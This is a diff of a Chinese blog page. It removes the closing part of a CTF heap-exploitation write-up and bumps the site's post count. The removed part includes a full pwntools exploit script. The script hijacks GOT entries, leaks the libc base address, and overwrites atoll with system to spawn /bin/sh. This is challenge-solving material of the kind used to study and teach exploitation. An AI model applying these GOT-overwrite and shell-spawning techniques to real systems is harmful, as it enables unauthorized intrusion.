-<h3 id="攻击！"><a href="#攻击！" class="headerlink" title="攻击！"></a>攻击！</h3><p>目标是 get shell，由于之前已经有了指向GOT的指针（栏位1中），所以我们想办法利用realloc中最后的那个read_input函数来再次修改GOT。<br>但由于realloc在中间会调用realloc（废话），直接让他realloc一个GOT中的区块大概率是要出问题的，而且程序会往realloc的返回值中读入数据。因此我们需要想一个办法让realloc调用返回之后，rax是GOT中区块的地址。</p>
-<p>静态分析一波，并没有发现什么 <code>mov rax, rdi; ret;</code> 的gadget，难道我的方法走不下去了吗？于是动态分析一波，惊喜地发现 <strong>程序在调用realloc之前，rax中就已经是GOT中区块地地址了</strong>，令人不得不感叹 <del>大自然</del> 出题人的鬼斧神工。</p>
-<p>所以就有了上面把realloc覆盖为一个简单的 <code>ret</code> 。这样一来，在执行了下面几句代码后，atoll就会变成system的地址（<strong>注意注释</strong>，很重要）：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;\0&#x27;</span>)          <span class="comment"># now atoll is puts, so puts(&quot;\0&quot;) = 1</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1111111\0&quot;</span>)   <span class="comment"># now atoll is puts, so puts(&quot;1111111\0&quot;) = 8</span></span><br><span class="line"><span class="comment"># we have hijacked realloc to &#x27;ret&#x27;, and when call realloc, rax has been same as rdi (which is really coincident)</span></span><br><span class="line"><span class="comment"># so program just pass and execute read_input(heap[v1], size)</span></span><br><span class="line">io.sendline(pack(libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br></pre></td></tr></table></figure>
-
-<p>最后，我们随便触发一个read_long，输入&#x2F;bin&#x2F;sh，就可以成功 get shell！当然，也可以直接输入 <code>cat ~/flag</code>，如果您需要节省时间的话。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params"><span class="built_in">id</span>, size, data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc</span>(<span class="params"><span class="built_in">id</span>, size, data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc_free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------- leak libc ----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.1 hijack GOT[atoll] to PLT[puts], GOT[realloc] to &#x27;ret&#x27;</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line">    realloc_free(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x18</span>, pack(elf.got[<span class="string">&quot;atoll&quot;</span>]))</span><br><span class="line">    free(<span class="number">1</span>)     <span class="comment"># alloc a anonymous 0x20 chunk</span></span><br><span class="line">    alloc(<span class="number">1</span>, <span class="number">0x18</span>, pack(elf.plt[<span class="string">&quot;puts&quot;</span>])+pack(<span class="number">0</span>)+pack(<span class="number">0x4015DC</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.2 leak libc load address (from stack)</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1111111\n&quot;</span>)   <span class="comment"># just padding</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;1111111\n&quot;</span>)</span><br><span class="line">    libc_base = unpack(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x1e570a</span></span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------- hijack GOT ----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.1 hijack GOT[atoi] to libc[system]</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;\0&#x27;</span>)          <span class="comment"># now atoll is puts, so puts(&quot;\0&quot;) = 1</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1111111\0&quot;</span>)   <span class="comment"># now atoll is puts, so puts(&quot;1111111\0&quot;) = 8</span></span><br><span class="line">    <span class="comment"># we have hijacked realloc to &#x27;ret&#x27;, and when call realloc, rax has been same as rdi (which is really coincident)</span></span><br><span class="line">    <span class="comment"># so program just pass and execute read_input(heap[v1], size)</span></span><br><span class="line">    io.sendline(pack(libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.2 trigger system(&quot;/bin/sh&quot;) by atoi(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    success(<span class="string">&quot;Enjoy your shell!&quot;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-<p>这个故事告诉我们：涉及内存安全的函数还是要小心小心再小心，仔细阅读手册、了解边界行为……</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1687,7 +1680,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">66</span>
+          <span class="site-state-item-count">67</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
